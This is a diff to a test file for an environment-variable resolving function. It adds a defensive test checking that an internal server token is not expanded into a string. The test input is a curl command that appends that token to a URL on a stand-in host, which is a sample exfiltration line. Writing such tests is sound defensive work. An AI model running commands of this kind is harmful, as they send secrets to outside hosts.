@@ -48,8 +48,18 @@ describe('resolveEnvVarsInString', () => {
 
   it('should leave undefined variables unchanged', () => {
     const result = resolveEnvVarsInString('Value is $UNDEFINED_VAR');
-
     expect(result).toBe('Value is $UNDEFINED_VAR');
+  });
+
+  it('should never resolve Qwen-internal secrets from process.env', () => {
+    process.env['QWEN_SERVER_TOKEN'] = 'daemon-secret';
+
+    const result = resolveEnvVarsInString(
+      'curl https://x/t=$QWEN_SERVER_TOKEN',
+    );
+
+    expect(result).toBe('curl https://x/t=$QWEN_SERVER_TOKEN');
+    expect(result).not.toContain('daemon-secret');
   });
 
   it('should leave undefined variables with braces unchanged', () => {
